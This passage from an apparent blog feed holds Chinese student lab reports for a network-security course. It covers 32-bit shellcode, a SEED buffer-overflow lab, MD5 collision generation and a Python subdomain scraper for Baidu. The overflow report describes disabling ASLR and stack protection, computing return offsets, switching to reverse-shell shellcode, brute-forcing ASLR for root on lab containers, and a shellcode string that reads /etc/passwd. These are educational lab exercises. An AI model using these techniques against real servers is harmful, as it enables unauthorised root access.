[ebx+32];ecx=ebx+32,to the addr of command<br>lea  edx, [ebx+40];edx=ebx+40,to the addr of env<br><br>xor eax, eax<br>mov al,  0x0b          <br>int 0x80              <br>    two:<br>call one              ; 10<br>db &#x27;/usr/bin/env****AAAA****BBBBCCCC****DDDD****EEEE****&#x27;<br></code></pre></td></tr></table></figure><p>编译、连接、执行的结果如下：</p><img src="/2024/02/20/Lab5_shellcode%E7%BC%96%E5%86%99/image-20230102213637509.png" class=""><h2 id="2-7-Task-3-Writing-64-bit-Shellcode">2.7 Task 3: Writing 64-bit Shellcode</h2><p>与task1.b相似，只是占位符由原来的3个变成7个，具体代码如下：</p><img src="/2024/02/20/Lab5_shellcode%E7%BC%96%E5%86%99/image-20230102213825989.png" class=""><p>运行结果如下：</p><img src="/2024/02/20/Lab5_shellcode%E7%BC%96%E5%86%99/image-20230102213839871.png" class="">]]></content>
    
    
    <categories>
      
      <category>网络攻防课程实验</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Lab4-缓冲区溢出</title>
    <link href="/2024/02/20/Lab4_%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/"/>
    <url>/2024/02/20/Lab4_%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/</url>
    
    <content type="html"><![CDATA[<h1>实验环境设置</h1><h1>Task 1: Get Familiar with the Shellcode</h1><p>Task：Please modify the shellcode, so you can use it to delete a file. Please include your modified the shellcode in the lab report, as well as your screenshots.</p><p>“/bin/ls -l; echo Hello 32; /bin/tail -n 2 /etc/passwd     *”</p><ol><li><p><strong>新建文件testfile</strong></p><img src="/2024/02/20/Lab4_%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/4.3.jpg" class=""></li><li><p><strong>修改shellcode_32.py，执行删除testfile的命令并输出“Hello,testfile has been moved”</strong></p><img src="/2024/02/20/Lab4_%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/4.4.jpg" class=""></li><li><p><strong>赋予shellcode_32.py和shellcode_64.py权限。</strong></p></li><li><p><strong>运行shellcode_32.py和shellcode_64.py，生成二进制shellcode文件</strong></p></li><li><p><strong>make指令编译</strong></p><img src="/2024/02/20/Lab4_%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/4.5.jpg" class=""></li><li><p><strong>测试shellcode</strong></p><img src="/2024/02/20/Lab4_%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/4.6.jpg" class=""><p>运行后testfile被删除</p><img src="/2024/02/20/Lab4_%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/4.7.jpg" class=""></li></ol><h1>Task2 Level-1 Attack</h1><p>task:Please modify the command string in your shellcode, so you can get a reverse shell on the target server. Please include screenshots and explanation in your lab report.</p><ol><li><p><strong>stack.c中存在溢出可能的代码</strong></p><p>在复制字符串到缓冲区时没有检查字符串大小。而这段代码把大小可达为517字节的字符串复制到大小为200字节的缓存区，因此存在栈溢出攻击。</p><img src="/2024/02/20/Lab4_%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/4.0.jpg" class=""></li><li><p><strong>关闭地址空间配置随机加载的设置</strong></p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">sudo /sbin/sysctl -w kernel.<span class="hljs-attribute">randomize_va_space</span>=0<br></code></pre></td></tr></table></figure><p><u>随机地址空间机制</u>是用来防御缓冲区溢出攻击的一种方式，使栈地址难以猜测。</p><img src="/2024/02/20/Lab4_%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/4.1.jpg" class=""></li><li><p><strong>在server-code文件夹下执行<code>make</code>和<code>make install</code>命令</strong></p><p><code>-z execstack 默认情况下，栈不可执行，这个参数设置为可执行栈</code></p><p><code>-fno-stack-protector 关闭StackGuard保护机制，这个机制用来检测缓冲区溢出</code></p><img src="/2024/02/20/Lab4_%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/4.8.jpg" class=""></li><li><p><strong>在Lab4setup文件夹下启动docker</strong></p><img src="/2024/02/20/Lab4_%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/4.9.jpg" class=""></li><li><p><strong>向服务器发送消息</strong></p><img src="/2024/02/20/Lab4_%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/4.0.1.jpg" class=""></li><li><p><strong>返回server端查看结果</strong></p><img src="/2024/02/20/Lab4_%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/image-20230102202343888.png" class=""><p>分析：</p><img src="/2024/02/20/Lab4_%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/lab4.1.jpg" class=""></li><li><p><strong><a href="http://xn--exploit-116kr69m.py">修改exploit.py</a></strong></p><p>ret=ebp+n=0xffffd528+8，其中ebp从6.中得到，n≥8；offset=0xffffd528-0xffffd4b8+4=116。offset是栈顶地址和存储返回地址的地址的偏移量，返回地址设置为前帧地址+8，指向存有NOP指令的地址，此后会遇到我们填充的多个NOP指令，知道遇到sellcode并执行。</p><img src="/2024/02/20/Lab4_%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/image-20230102202410728.png" class=""></li><li><p><strong>运行exploit.py并把badfile发送给10.9.0.5</strong></p></li><li><p><strong>返回server查看结果</strong></p><img src="/2024/02/20/Lab4_%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/image-20230102202517389.png" class=""></li><li><p><strong>将 shellcode 改为 reverse shell</strong></p><img src="/2024/02/20/Lab4_%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/image-20230102203216636.png" class=""></li><li><p><strong>在新的终端中执行监听</strong></p><img src="/2024/02/20/Lab4_%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/image-20230102203224397.png" class=""></li><li><p><strong><a href="http://xn--exploit-wr9ko66jjis2k7e.py">再次执行exploit.py</a></strong></p><img src="/2024/02/20/Lab4_%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/image-20230102203232264.png" class=""></li><li><p><strong>结果：得到了权限</strong></p><img src="/2024/02/20/Lab4_%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/image-20230102203239294.png" class=""></li></ol><h1>Task 3: Level-2 Attack</h1><p>不知道缓冲区大小，只知道范围为[100,300]bytes。</p><p>task:Your job is to construct one payload to exploit the buffer overflow vulnerability on the server, and get a root shell on the target server (using the reverse shell technique).</p><ol><li><p><strong>向服务端发送消息，建立连接</strong></p><img src="/2024/02/20/Lab4_%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/4.0.5%EF%BC%883%EF%BC%89.jpg" class=""></li><li><p><strong>server端结果：</strong></p><img src="/2024/02/20/Lab4_%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/image-20230102203408202.png" class=""></li><li><p><strong><a href="http://xn--exploit-116kr69m.py">修改exploit.py</a></strong></p><p>应满足ret≥0xffffd468+308，100≤offset≤300。因为offset需要在[100，300]区间内尝试，所以ret的最小值应该要大于offset的最大值+8。</p><img src="/2024/02/20/Lab4_%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/image-20230102203453820.png" class=""></li><li><p><strong><a href="http://xn--exploit-cb1ux83c.py">运行exploit.py</a></strong></p><img src="/2024/02/20/Lab4_%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/image-20230102203529020.png" class=""></li><li><p><strong>得到结果</strong></p><img src="/2024/02/20/Lab4_%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/image-20230102203556189.png" class=""></li></ol><h1>Task 4: Level-3 Attack</h1><ol><li><p><strong>向服务端发送消息，建立连接</strong></p></li><li><p><strong>返回server查看结果</strong></p><img src="/2024/02/20/Lab4_%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/image-20230102203701925.png" class=""><p>分析：</p><img src="/2024/02/20/Lab4_%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/lab4.2.jpg" class=""></li><li><p><strong><a href="http://xn--exploit-116kr69m.py">修改exploit.py</a></strong></p><p>shellcode部分为shellcode_64中的shellcode，ret=0x00007fffffffe460，offset=0x00007fffffffe460-0x00007fffffffe390+8=216。因为64位的地址存在零，所以当strcpy函数遇到ret使就会停止。但是由于计算机采用小端模式，所以只要将sellcode存放在缓冲区的最开始，并让ret指向的地址为缓冲区最开始的地址，就可以让shellcode执行。</p><img src="/2024/02/20/Lab4_%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/image-20230102203730066.png" class=""></li><li><p><strong>运行exploit.py并把badfile发送给10.9.0.7</strong></p><img src="/2024/02/20/Lab4_%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/4.0.12%EF%BC%884%EF%BC%89.jpg" class=""></li><li><p><strong>查看结果</strong></p><img src="/2024/02/20/Lab4_%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/image-20230102203806512.png" class=""></li></ol><h1>Task 5 Level-4 Attack</h1><ol><li><p><strong>向服务端发送消息</strong></p><img src="/2024/02/20/Lab4_%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/image-20230102203913061.png" class=""></li><li><p><strong>返回server查看结果</strong></p><img src="/2024/02/20/Lab4_%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/image-20230102203929536.png" class=""><p>分析：</p><img src="/2024/02/20/Lab4_%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/lab4.3.jpg" class=""></li><li><p><strong><a href="http://xn--exploit-116kr69m.py">修改exploit.py</a></strong></p><p>其中，ret=0x00007fffffffe460+1200，offset=0x00007fffffffe460-0x00007fffffffe400+8=104</p><img src="/2024/02/20/Lab4_%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/image-20230102203944459.png" class=""></li><li><p><a href="http://xn--exploit-cb1ux83c.py">运行exploit.py</a></p><img src="/2024/02/20/Lab4_%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/image-20230102204014021.png" class=""></li><li><p>查看结果</p><img src="/2024/02/20/Lab4_%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/image-20230102204028417.png" class=""></li></ol><h1>Task 6: Experimenting with the Address Randomization</h1><ol><li><p><strong>打开地址随机化</strong></p><img src="/2024/02/20/Lab4_%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/4.0.18%EF%BC%886%EF%BC%89.jpg" class=""></li><li><p><strong>各执行两次“<code>echo hello | nc 10.9.0.5 9090</code>”、“<code>echo hello | nc 10.9.0.7 9090</code>”</strong></p><img src="/2024/02/20/Lab4_%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/4.0.20%EF%BC%886%EF%BC%89.jpg" class=""></li><li><p><strong>查看结果</strong></p><p>可以看到，打开地址随机化之后，每次执行结果的地址都不一样。所以前面的方法就不使用，但是根据实验手册的提示，我们可以通过暴力搜索的方法成功执行shellcode。</p><img src="/2024/02/20/Lab4_%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/4.0.19%EF%BC%886%EF%BC%89.jpg" class=""></li><li><p><strong>监听</strong></p><img src="/2024/02/20/Lab4_%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/image-20230102204222948.png" class=""></li><li><p><strong>使用Task2中reverse shell的exploit.py代码</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">./exploit.py<br>./brute-force.sh<br></code></pre></td></tr></table></figure></li><li><p><strong>取得权限</strong></p><p>可以看到，在尝试25000+次后，在监听窗口中成功拿到了root权限。</p><img src="/2024/02/20/Lab4_%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/image-20230102204359046.png" class=""></li></ol><h1>Tasks 7: Experimenting with Other Countermeasures</h1><ol><li><p><strong>在server-code文件夹下，去除-fno-stack-protector编译stack.c，然后将badfile作为输入。</strong></p><img src="/2024/02/20/Lab4_%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/image-20230102204449144.png" class=""><p>可以看到，提示“stack smashing detected”，检测到了stack smashing。</p></li><li><p><strong>在shellcode文件夹下，去除-z noexecstack编译call_shellcode.c</strong></p><img src="/2024/02/20/Lab4_%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/image-20230102204506696.png" class=""><p>提示“Segmentation fault”，栈不可执行。</p></li></ol>]]></content>
    
    
    <categories>
      
      <category>网络攻防课程实验</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Lab3-MD5碰撞实验</title>
    <link href="/2024/02/20/Lab3_MD5%E7%A2%B0%E6%92%9E%E5%AE%9E%E9%AA%8C/"/>
    <url>/2024/02/20/Lab3_MD5%E7%A2%B0%E6%92%9E%E5%AE%9E%E9%AA%8C/</url>
    
    <content type="html"><![CDATA[<h1>1 作业题目</h1><p>使用SEED实验环境中的工具及编程语言，完成以下任务：</p><p>a)使用md5collgen生成两个MD5值相同的文件，并利用bless十六进制编辑器查看输出的两个文件，描述你观察到的情况；</p><p>b)参考Lab3_task2.c的代码，生成两个MD5值相同但输出不同的两个可执行文件。</p><p>c)参考Lab3_task3.c的代码，生成两个MD5值相同但代码行为不相同的可执行文件。</p><p>d)回答问题：通过上面的实验，请解释为什么可以做到不同行为的两个可执行文件具有相同的MD5值？</p><h1>2 实验步骤及结果</h1><h2 id="2-1-使用md5collgen生成两个MD5值相同的文件">2.1 使用md5collgen生成两个MD5值相同的文件</h2><p><strong>1、原理</strong></p><img src="/2024/02/20/Lab3_MD5%E7%A2%B0%E6%92%9E%E5%AE%9E%E9%AA%8C/3.3.png" class=""><p><strong>2、创建文件prefix.txt，内容为“hello”</strong></p><img src="/2024/02/20/Lab3_MD5%E7%A2%B0%E6%92%9E%E5%AE%9E%E9%AA%8C/3.4.png" class=""><p><strong>3、使用md5collgen工具生成两个前缀相同的文件：prefix1、prefix2</strong></p><img src="/2024/02/20/Lab3_MD5%E7%A2%B0%E6%92%9E%E5%AE%9E%E9%AA%8C/3.5.png" class=""><p><strong>4、查看两个文件的MD5是否相同</strong></p><img src="/2024/02/20/Lab3_MD5%E7%A2%B0%E6%92%9E%E5%AE%9E%E9%AA%8C/3.6.png" class=""><p>可以看到，两个文件的MD5值相同。</p><p><strong>5、使用bless产看输出的两个文件</strong></p><p>通过bless的查看结果可以发现，利用md5collgen工具生成的两个文件前缀相同，并且内容相似，但是存在有差异。</p><img src="/2024/02/20/Lab3_MD5%E7%A2%B0%E6%92%9E%E5%AE%9E%E9%AA%8C/3.7.png" class=""><p>通过diff命令的查看结果可以验证，这两个具有相同MD5值的文件在内容上并不相同。</p><img src="/2024/02/20/Lab3_MD5%E7%A2%B0%E6%92%9E%E5%AE%9E%E9%AA%8C/3.8.png" class=""><h2 id="2-2-两个MD5值相同但输出不同的两个可执行文件">2.2 两个MD5值相同但输出不同的两个可执行文件</h2><p><strong>1、原理</strong></p><img src="/2024/02/20/Lab3_MD5%E7%A2%B0%E6%92%9E%E5%AE%9E%E9%AA%8C/3.9.png" class=""><p><strong>2、Lab3_task2.c内容如下</strong></p><img src="/2024/02/20/Lab3_MD5%E7%A2%B0%E6%92%9E%E5%AE%9E%E9%AA%8C/3.10.png" class=""><p><strong>3、利用bless定位字符串，计算截取范围</strong></p>]]></content>
    
    
    <categories>
      
      <category>网络攻防课程实验</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Lab1-域名信息搜集</title>
    <link href="/2024/02/20/Lab1_%E5%9F%9F%E5%90%8D%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/"/>
    <url>/2024/02/20/Lab1_%E5%9F%9F%E5%90%8D%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/</url>
    
    <content type="html"><![CDATA[<h1>1 作业题目</h1><p>本次实验主要考察大家的编程能力及子域名的信息收集方法，在文件夹“Lab1_code”提供了使用Bing搜索引擎的域名收集功能。请对该代码进行扩展，使其可支持百度搜索引擎的域名收集功能。需要实现如下功能：</p><p>a) 支持百度搜索引擎的域名提取，其中从百度搜索引擎提取的域名需为真实域名，而非百度的域名跳转链接；</p><p>b) 可扩充其他功能，比如域名所在的标题等信息。</p><h1>2 实验步骤及结果</h1><h2 id="2-1-根据百度搜索引擎的特点和搜索条件构造url">2.1 根据百度搜索引擎的特点和搜索条件构造url</h2><p>1、观察bing搜索引擎与百度搜索引擎在url上的不同</p><img src="/2024/02/20/Lab1_%E5%9F%9F%E5%90%8D%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/image-20230101160154241.png" class=""><img src="/2024/02/20/Lab1_%E5%9F%9F%E5%90%8D%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/image-20230101160224224.png" class=""><p>2、输入搜索条件：domain:qq.com，观察百度搜索引擎的搜索结果，对比每一页url的变化</p><p>①在搜索框输入domain:qq.com，观察不同页码对应的url变化</p><p>第一页：</p><img src="/2024/02/20/Lab1_%E5%9F%9F%E5%90%8D%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/image-20230101160256944.png" class=""><p>第二页：</p><img src="/2024/02/20/Lab1_%E5%9F%9F%E5%90%8D%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/image-20230101160312148.png" class=""><p>第三页：</p><img src="/2024/02/20/Lab1_%E5%9F%9F%E5%90%8D%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/image-20230101160317251.png" class=""><p>对比第2、3页发现，它们的不同之处在于第二页有参数pn=10，而第三页为pn=20。因此猜测pn参数决定页码，修改pn为0，可以跳转到第一页：</p><img src="/2024/02/20/Lab1_%E5%9F%9F%E5%90%8D%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/image-20230101160329795.png" class=""><p>②对比前四次访问的url，确定最终需要的url形式为：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">https</span>://www.baidu.com/s?wd=domain%<span class="hljs-number">3</span>Aqq.com&amp;pn=“页码”&amp;oq=domain%<span class="hljs-number">3</span>Aqq.com&amp;ie=utf-<span class="hljs-number">8</span><br></code></pre></td></tr></table></figure><h2 id="2-2-编程实践">2.2 编程实践</h2><p>1、构造请求头</p><p>2、从第一页到指定页数，循环构造对应页码的url，搜集每一页的子域名</p><p>3、利用request库和BeautifulSoup库获取包含域名信息的a标签对应的h3标签，得到一个h3标签列表</p><p>4、遍历每一个h3标签，得到对应的域名</p><p>①获取h3标签中的a标签的跳转url，利用if判断和url列表，避免url重复</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs py">link = i.a.get(<span class="hljs-string">&#x27;href&#x27;</span>)  <span class="hljs-comment"># 循环获取‘href’的内容</span><br><span class="hljs-keyword">if</span> link <span class="hljs-keyword">in</span> links:  <span class="hljs-comment"># 避免url重复</span><br><span class="hljs-keyword">pass</span><br><span class="hljs-keyword">else</span>:<br>  links.append(link)<br>  ......<br></code></pre></td></tr></table></figure><p>②访问跳转url，得到真正的域名</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs py">new_response = requests.get(url=link, headers=headers)  <span class="hljs-comment"># 访问跳转链接domain_row = new_response.url  # 得到真正的url</span><br></code></pre></td></tr></table></figure><p>③域名过滤：过滤非目标域名（非“<a href="http://qq.com">qq.com</a>”），过滤重复域名</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs py">index = domain_row.find(<span class="hljs-string">&#x27;qq.com&#x27;</span>)  <span class="hljs-comment"># 去除不相干域名</span><br><span class="hljs-keyword">if</span> index + <span class="hljs-number">1</span>:<br>domain = <span class="hljs-built_in">str</span>(urlparse(domain_row).scheme + <span class="hljs-string">&quot;://&quot;</span> + urlparse(domain_row).netloc)  <span class="hljs-comment"># 得到真正的域名</span><br>    <span class="hljs-keyword">if</span> domain <span class="hljs-keyword">in</span> Subdomain:  <span class="hljs-comment"># 去除重复域名</span><br>          <span class="hljs-keyword">pass</span><br><span class="hljs-keyword">else</span>:<br>          ......(处理)<br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-keyword">pass</span><br></code></pre></td></tr></table></figure><p>④获取域名以及对应的标题信息</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">Subdomain.append(<span class="hljs-keyword">domain</span>)                            <br>print(<span class="hljs-string">&#x27;domain:&#123;&#125;&#x27;</span>.format(<span class="hljs-keyword">domain</span>), end=<span class="hljs-string">&#x27;  &#x27;</span>)<br>print(<span class="hljs-string">&#x27;name:&#123;&#125;&#x27;</span>.format(i.a.text))<br></code></pre></td></tr></table></figure><p><strong>完整代码</strong></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-comment"># 本次实验内容主要为：收集baidu.com域名下的子域名，</span><br><span class="hljs-comment"># 收集方法为使用bing搜索引擎，采用爬手段，爬取搜索到的域名</span><br><span class="hljs-comment"># bing搜索引擎搜索子域名的语法为：domain:[域名]</span><br><span class="hljs-keyword">import</span> requests  <span class="hljs-comment"># 用于请求网页</span><br><span class="hljs-keyword">from</span> bs4 <span class="hljs-keyword">import</span> BeautifulSoup  <span class="hljs-comment"># 用于处理获取的到的网页源码数据</span><br><span class="hljs-keyword">from</span> urllib.parse <span class="hljs-keyword">import</span> urlparse  <span class="hljs-comment"># 用于处理url</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">baidu_search</span>():<br>    <span class="hljs-comment"># 定义一个采用baidu搜索的方法</span><br>    links = []<br>    Subdomain = []<br><br>    headers = &#123;<br>        <span class="hljs-string">&#x27;User-Agent&#x27;</span>: ...,<br>        <span class="hljs-string">&#x27;Connection&#x27;</span>: <span class="hljs-string">&#x27;close&#x27;</span>,<br>        <span class="hljs-string">&#x27;Cookie&#x27;</span>:...<br>    &#125;<br><br>    <span class="hljs-keyword">for</span> page <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-number">3</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;page &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(page + <span class="hljs-number">1</span>))<br>        url = <span class="hljs-string">&#x27;https://www.baidu.com/s?wd=domain%3Aqq.com&amp;pn=&#123;&#125;&amp;oq=domain%3Aqq.com&amp;ie=utf-8&#x27;</span>.<span class="hljs-built_in">format</span>(page * <span class="hljs-number">10</span>)<br><br>        resp = requests.get(url, headers=headers)<br><br>        <span class="hljs-comment"># 创建一个BeautifulSoup对象，第一个参数是网页源码，第二个参数是Beautiful Soup 使用的 HTML 解析器</span><br>        soup = BeautifulSoup(resp.text, <span class="hljs-string">&#x27;html.parser&#x27;</span>)<br>        job_bt = soup.find_all(<span class="hljs-string">&#x27;h3&#x27;</span>)  <span class="hljs-comment"># find_all()查找源码中所有&lt;h2&gt;标签的内容</span><br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> job_bt:<br>            link = i.a.get(<span class="hljs-string">&#x27;href&#x27;</span>)  <span class="hljs-comment"># 循环获取‘href’的内容</span><br>            <span class="hljs-keyword">if</span> link <span class="hljs-keyword">in</span> links:  <span class="hljs-comment"># 避免url重复</span><br>                <span class="hljs-keyword">pass</span><br>            <span class="hljs-keyword">else</span>:<br>                links.append(link)<br>                <span class="hljs-keyword">try</span>:  <span class="hljs-comment"># 跳过无法访问的url</span><br>                    new_response = requests.get(url=link, headers=headers)  <span class="hljs-comment"># 访问跳转链接</span><br>                    domain_row = new_response.url  <span class="hljs-comment"># 得到真正的url</span><br><br>                    index = domain_row.find(<span class="hljs-string">&#x27;qq.com&#x27;</span>)  <span class="hljs-comment"># 去除不相干域名</span><br>                    <span class="hljs-keyword">if</span> index + <span class="hljs-number">1</span>:<br>                        <span class="hljs-comment"># urlparse是一个解析url的工具，scheme获取url的协议名，netloc获取url的网络位置</span><br>                        domain = <span class="hljs-built_in">str</span>(urlparse(domain_row).scheme + <span class="hljs-string">&quot;://&quot;</span> + urlparse(domain_row).netloc)  <span class="hljs-comment"># 得到真正的域名</span><br>                        <span class="hljs-keyword">if</span> domain <span class="hljs-keyword">in</span> Subdomain:  <span class="hljs-comment"># 去除重复域名</span><br>                            <span class="hljs-keyword">pass</span><br>                        <span class="hljs-keyword">else</span>:<br>                            Subdomain.append(domain)<br>                            <span class="hljs-comment"># print(&#x27;link:&#123;&#125;&#x27;.format(link))</span><br>                            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;domain:&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(domain), end=<span class="hljs-string">&#x27;  &#x27;</span>)<br>                            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;name:&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(i.a.text))<br>                    <span class="hljs-keyword">else</span>:<br>                        <span class="hljs-keyword">pass</span><br>                <span class="hljs-keyword">except</span>:<br>                    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;name:&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(i.a.text), end=<span class="hljs-string">&#x27;  &#x27;</span>)<br>                    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;connection refused:&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(link))<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;there are &#123;&#125; domains&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">len</span>(Subdomain)))<br><br><br>baidu_search()<br></code></pre></td></tr></table></figure><h1>3 结果展示</h1><p>利用百度搜索引擎提取相关域名和标题信息，展示1-50页的提取结果</p><img src="/2024/02/20/Lab1_%E5%9F%9F%E5%90%8D%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/image-20230101161046696.png" class=""><h1>4 问题及解决</h1><p>1、通过百度搜索引擎提取到的是跳转链接而非真实域名</p><p>解决：再次访问跳转链接，通过.url属性得到真正的域名。</p><p>2、百度搜索引擎根据“doamin:qq.com”查询条件得到的查询结果仍然存在不相关的域名，如下图，出现了知乎的域名，需要对这部分域名进行过滤。</p><img src="/2024/02/20/Lab1_%E5%9F%9F%E5%90%8D%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/image-20230101161144531.png" class=""><p>解决：对这部分域名进行过滤，只保留包含查询条件的域名：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs py">index = domain_row.find(<span class="hljs-string">&#x27;qq.com&#x27;</span>)  <span class="hljs-comment"># 去除不相干域名</span><br><span class="hljs-keyword">if</span> index + <span class="hljs-number">1</span>:<br>    ......<br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-keyword">pass</span><br></code></pre></td></tr></table></figure><p>3、存在不可访问的链接，可能导致程序报错</p><img src="/2024/02/20/Lab1_%E5%9F%9F%E5%90%8D%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/image-20230101161234086.png" class=""><img 